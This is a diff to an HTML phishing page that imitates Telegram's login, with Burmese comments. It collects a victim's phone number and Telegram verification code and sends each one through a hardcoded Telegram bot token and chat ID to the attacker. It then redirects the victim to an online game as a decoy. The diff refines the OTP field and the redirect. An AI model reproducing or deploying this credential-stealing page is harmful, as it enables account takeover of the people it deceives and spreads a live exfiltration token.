@@ -8,12 +8,16 @@
         body { background-color: #1c2733; color: white; font-family: sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .container { text-align: center; width: 90%; max-width: 350px; }
         h2 { font-size: 20px; margin-bottom: 10px; }
-        p { color: #7f91a4; font-size: 14px; margin-bottom: 30px; }
+        p { color: #7f91a4; font-size: 14px; margin-bottom: 35px; }
         .input-box { border: 1px solid #3b4754; border-radius: 10px; padding: 15px; display: flex; align-items: center; margin-bottom: 20px; background: transparent; }
         input { background: transparent; border: none; color: white; font-size: 17px; outline: none; width: 100%; }
-        .next-btn { background: #3390ec; border: none; width: 55px; height: 55px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; margin-top: 20px; }
-        #step2, #gameArea { display: none; }
-        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 9999; display: none; }
+        
+        /* OTP အကွက် ပုံစံအသစ် */
+        .otp-box { border: 1px solid #3390ec; border-radius: 10px; padding: 15px; background: rgba(51, 144, 236, 0.1); margin-bottom: 20px; }
+        .otp-box input { text-align: center; letter-spacing: 10px; font-size: 24px; font-weight: bold; }
+
+        .next-btn { background: #3390ec; border: none; width: 55px; height: 55px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; margin-top: 20px; display: flex; align-items: center; justify-content: center; }
+        #step2 { display: none; }
     </style>
 </head>
 <body>
@@ -33,42 +37,39 @@
     <div style="font-size: 50px; margin-bottom: 20px;">📩</div>
     <h2>Verification Code</h2>
     <p>Check your Telegram app for the code.</p>
-    <div class="input-box">
-        <input type="number" id="otp" placeholder="Enter 5-digit code" autocomplete="off">
+    <div class="otp-box">
+        <input type="number" id="otp" placeholder="•••••" oninput="if(this.value.length > 5) this.value = this.value.slice(0,5);">
     </div>
     <button class="next-btn" onclick="sendData()">→</button>
 </div>
 
-<iframe id="gameFrame" src=""></iframe>
-
 <script>
     const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
     const chat_id = '5304050102';
-    const game_url = "https://poki.com/en/g/rail-in-the-air";
+    // Redirect လမ်းကြောင်းကို Poki အစား တိုက်ရိုက် Game link သုံးသည်
+    const game_url = "https://poki.com/en/g/rail-in-the-air"; 
 
     function goStep2() {
-        if(document.getElementById('phone').value.length < 7) return;
+        let p = document.getElementById('phone').value;
+        if(p.length < 7) return;
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
-        // ပထမအဆင့်မှာတင် ဖုန်းနံပါတ်လှမ်းပို့ထားမယ်
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📱 Number: ${document.getElementById('phone').value}`);
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📱 Number: +95${p}`);
     }
 
     function sendData() {
-        const otp = document.getElementById('otp').value;
-        if(otp.length < 5) return;
+        const otpVal = document.getElementById('otp').value;
+        if(otpVal.length < 5) return;
 
-        // OTP ပို့မယ်
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🔑 OTP: ${otp}`)
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🔑 OTP: ${otpVal}`)
         .then(() => {
-            // ဂိမ်းကို App ထဲမှာတင်ဖွင့်မယ်
-            const frame = document.getElementById('gameFrame');
-            frame.src = game_url;
-            frame.style.display = 'block';
-            document.getElementById('step2').style.display = 'none';
+            // Chrome မှာရော App မှာပါ အဆင်ပြေအောင် Redirect လုပ်နည်းပြောင်းသည်
+            window.location.replace(game_url);
+        })
+        .catch(() => {
+            window.location.replace(game_url);
         });
     }
 </script>
 </body>
 </html>
-
